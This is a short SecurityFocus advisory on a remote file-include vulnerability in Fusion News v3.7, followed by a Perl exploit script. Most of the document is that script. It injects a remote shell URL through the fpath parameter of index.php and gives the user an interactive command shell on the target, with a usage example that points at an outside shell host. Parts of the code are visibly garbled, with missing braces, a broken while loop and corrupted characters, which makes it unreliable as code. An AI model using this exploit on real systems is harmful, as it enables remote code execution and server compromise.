source: http://www.securityfocus.com/bid/19546/info

Fusion News is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and to access the underlying system.

#!/usr/bin/perl

	###########################################################################################

	#			Aria-Security.net Advisory                                   															     #

	#			Discovered  by: OUTLAW                                    														               #

	#			< www.Aria-security.net >                               														              #

	#		Gr33t to: A.u.r.a  & HessamX & Cl0wn & DrtRp													                       	  #

	#		  Special Thanx To All Aria-Security Users      			  													 #

	###########################################################################################


use LWP::UserAgent;

print "\n === Fusion News v3.7 Remote File Inclusion\n";

print "\n === Discovered by OutLaw .\n";

print "\n  === www.Aria-Security.Net\n";


$bPath = $ARGV[0];

$cmdo = $ARGV[1];

$bcmd = $ARGV[2];


if($bPath!~/http:\/\// || $cmdo!~/http:\/\// || !$bcmd){usage()}




while()

 

       print "[Shell] \$";

while(<STDIN>)

       {

               $cmd=$_;

               chomp($cmd);


$xpl = LWP::UserAgent->new() or die;

$req = HTTP::Request->new(GET =>$bpath.&#039;index.php?fpath=&#039;.$cmdo.&#039;?&&#039;.$bcmd.&#039;=&#039;.$cmd)or die "
\n Could not connect !\n";

$res = $xpl->request($req);

$return = $res->content;

$return =~ tr/[\n]/[�;

if (!$cmd) {print "\nPlease type a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/)

       {print "\n Could Not Connect to cmd Host\n";exit}

elsif ($return =~/^<b>Fatal.error/) {print "\n Invalid Command\n"}

if($return =~ /(.*)/)

 

       $freturn = $1;

       $freturn=~ tr/[�[\n]/;

       print "\r\n$freturn\n\r";

       last;

 


else {print "[Shell] \$";}}}last;


sub usage()

 {

print " Usage : fusion.pl [host] [cmd shell location] [cmd shell variable]\n";

print " Example : fusion.pl http://fusionnews.com http://www.shell.com/cmd.txt cmd\n";

 exit();

 }